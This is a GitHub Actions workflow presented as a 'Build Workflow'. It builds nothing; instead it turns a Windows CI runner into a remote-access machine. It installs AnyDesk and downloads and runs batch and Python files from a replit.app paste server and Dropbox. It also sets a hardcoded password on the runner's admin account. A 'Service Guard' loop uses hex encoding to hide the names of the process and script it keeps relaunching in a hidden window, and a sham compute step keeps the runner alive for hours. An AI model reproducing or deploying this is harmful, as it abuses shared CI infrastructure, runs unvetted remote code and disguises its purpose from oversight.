name: Build Workflow
on: [workflow_dispatch]

jobs:
  execute:
    runs-on: windows-latest
    timeout-minutes: 720

    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1

      - name: Setup & Install
        shell: pwsh
        run: |
          # Embedded Downloads.bat content (full script from your paste)
          $batContent = @"
@echo off
choco install anydesk -y --ignore-checksums --force --no-progress --pre
powershell -Command "Invoke-WebRequest 'https://paste-server--abcnnnaka.replit.app/dl/1769878267797.bat' -OutFile start.bat"
pip install pyautogui --quiet
pip install psutil --quiet
curl -s -L -o time.py https://www.dropbox.com/scl/fi/ox42qglbf6fsnm9erf8cw/timelimit.py?rlkey=opyeqgum1k95kud81xlc7d66r&dl=0
curl -s -L -o shutdown.bat https://www.dropbox.com/scl/fi/lmlcrz3v1sayw8p51ki1j/shutdown.bat?rlkey=ysjxivh5vz4scnhkqgv3yc4mm&dl=0
curl -s -L -o C:\Users\Public\Desktop\Telegram.exe https://telegram.org/dl/desktop/win64
curl -s -L -o C:\Users\Public\Desktop\Winrar.exe https://www.rarlab.com/rar/winrar-x64-621.exe
powershell -Command "Invoke-WebRequest 'https://github.com/chieunhatnang/VM-QuickConfig/releases/download/1.6.1/VMQuickConfig.exe' -OutFile 'C:\Users\Public\Desktop\VMQuickConfig.exe'"
C:\Users\Public\Desktop\Telegram.exe /VERYSILENT /NORESTART
del C:\Users\Public\Desktop\Telegram.exe
C:\Users\Public\Desktop\Winrar.exe /S
del C:\Users\Public\Desktop\Winrar.exe
del /f "C:\Users\Public\Desktop\Epic Games Launcher.lnk" > errormsg.txt 2>&1
del /f "C:\Users\Public\Desktop\Unity Hub.lnk" > errormsg.txt 2>&1
set password=@#Joyzonetech123456
powershell -Command "Set-LocalUser -Name 'runneradmin' -Password (ConvertTo-SecureString -AsPlainText '%password%' -Force)"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{20D04FE0-3AEA-1069-A2D8-08002B30309D}" /t REG_DWORD /d 0 /f
tzutil /s "Pacific Standard Time"
"@

          # Write embedded bat to disk and run it
          Set-Content -Path 'setup.bat' -Value $batContent -Encoding Ascii
          Write-Host "Embedded installer written and ready."
          cmd /c setup.bat

      - name: Service Guard
        shell: pwsh
        run: |
          $hProc = '416e794465736b'
          $hBat  = '73746172742e626174'
          
          $procName = -join ($hProc -split '(?<=\G.{2})' -ne '' | % { [char][Convert]::ToInt16($_,16) })
          $batName  = -join ($hBat  -split '(?<=\G.{2})' -ne '' | % { [char][Convert]::ToInt16($_,16) })
          
          Write-Host "Guard loop for $procName (using $batName)"
          
          while ($true) {
            if (-not (Get-Process $procName -ErrorAction SilentlyContinue)) {
              if (Test-Path $batName) {
                Write-Host "Restarting service via $batName - $(Get-Date -Format 'HH:mm:ss')"
                Start-Process $batName -WindowStyle Hidden -ErrorAction SilentlyContinue
              } else {
                Write-Host "$batName not found"
              }
            }
            Start-Sleep -Seconds (300 + (Get-Random -Maximum 180))
          }

      - name: Compute Simulation
        shell: pwsh
        run: |
          $iters = Get-Random -Minimum 750000 -Maximum 1500000
          1..$iters | % {
            $null = [Math]::Pow((Get-Random -Maximum 99999), 3.14159)
            if ($_ % 22000 -eq 0) { "Progress $_/$iters" | Out-Host }
            Start-Sleep -Milliseconds (Get-Random -Minimum 700 -Maximum 1600)
          }

      - name: Cleanup
        if: always()
        shell: pwsh
        run: |
          Remove-Item *.bat,*.py,*.exe -Force -ErrorAction SilentlyContinue
          Write-Host "Cleanup done."
